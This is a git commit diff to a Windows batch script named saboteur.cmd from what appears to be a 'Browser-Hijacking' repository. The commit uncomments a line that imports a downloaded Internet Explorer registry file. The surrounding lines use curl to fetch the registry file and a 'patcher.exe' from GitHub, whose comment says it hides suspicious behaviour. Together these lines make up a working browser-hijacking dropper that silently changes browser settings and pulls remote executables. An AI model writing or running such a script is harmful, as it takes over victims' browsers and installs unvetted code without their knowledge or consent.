1cdd2533567c905ff1b204245891dc072f97a89c
icesonata <hoanglong1622000@gmail.com>
2021-07-22 00:18:29 +0700

    uncomment registry importing

--- saboteur.cmd
+++ saboteur.cmd
@@ -1,7 +1,7 @@
 @REM Download IE configuration registry file
 curl -o %tmp%\ieconf.reg -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO
 @REM Import configuration file into registry
-@REM reg import %tmp%\ieconf.reg
+reg import %tmp%\ieconf.reg
 @REM Download patcher to make the program run normally without suspicious behavior
 curl -o %tmp%\patcher.exe -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/patcher.exe
 @REM Execute patcher
